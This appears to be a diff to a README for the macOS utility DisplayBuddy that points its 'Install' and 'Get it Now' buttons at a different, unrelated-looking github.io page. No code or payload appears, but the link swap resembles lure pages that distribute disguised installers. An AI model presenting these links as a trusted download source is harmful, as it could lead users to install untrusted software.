@@ -6,7 +6,7 @@
 
 <div align="center">
 
-[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://polycia-apps.github.io/.github/displayBuddy)
+[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://urinoterapia-sigma.github.io/.github/displayBuddy)
 
 </div>
 
@@ -81,7 +81,7 @@ DisplayBuddy's DDC brightness control is qualitatively different from software o
 
 <p align="center">
 
-[![Get it Now DisplayBuddy](https://img.shields.io/badge/Get_it_Now-023E8A?style=for-the-badge&logo=apple&logoColor=white)](https://polycia-apps.github.io/.github/displayBuddy)
+[![Get it Now DisplayBuddy](https://img.shields.io/badge/Get_it_Now-023E8A?style=for-the-badge&logo=apple&logoColor=white)](https://urinoterapia-sigma.github.io/.github/displayBuddy)
 
 </p>
 
